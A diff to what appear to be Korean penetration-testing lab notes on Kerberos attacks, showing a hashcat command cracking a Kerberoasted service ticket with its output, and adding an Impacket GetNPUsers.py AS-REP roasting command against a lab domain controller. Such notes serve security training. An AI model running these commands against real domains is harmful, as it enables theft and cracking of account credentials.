@@ -124,7 +124,7 @@ MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users
 
 **해시캣으로 오프라인에서 티켓 크래킹하기**
 
-```
+```bash
 [!bash!]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -151,4 +151,12 @@ Candidates.#1....: davius07 -> darten170
 
 Started: Tue Feb 15 17:44:49 2022
 Stopped: Tue Feb 15 17:45:41 2022
+```
+
+## GetNPUsers.py
+
+Kerberos 사전 인증이 필요하지 않은 사용자를 위한 헌팅
+
+```bash
+GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
 ```
